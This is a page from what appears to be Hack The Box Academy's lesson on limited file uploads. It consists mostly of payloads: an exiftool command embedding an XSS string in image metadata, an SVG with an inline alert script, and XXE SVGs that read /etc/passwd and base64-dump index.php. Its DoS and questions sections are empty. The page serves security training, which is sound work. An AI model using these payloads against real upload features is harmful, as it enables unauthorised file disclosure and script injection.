<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/136/section/1291
// Platform Version: V1
// Module ID: 136
// Module Name: File Upload Attacks
// Module Difficulty: Medium
// Section ID: 1291
// Section Title: Limited File Uploads
// Page Title: Hack The Box - Academy
// Page Number: 8
-->

# Limited File Uploads

**Module Name:** File Upload Attacks **Page Number:** 8

#### 

#### FILE UPLOAD ATTACKS

# Limited File Uploads

## XSS

``` shell-session
[!bash!]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
[!bash!]$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

## XXE

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

## DoS

# 

# 

#### Questions

####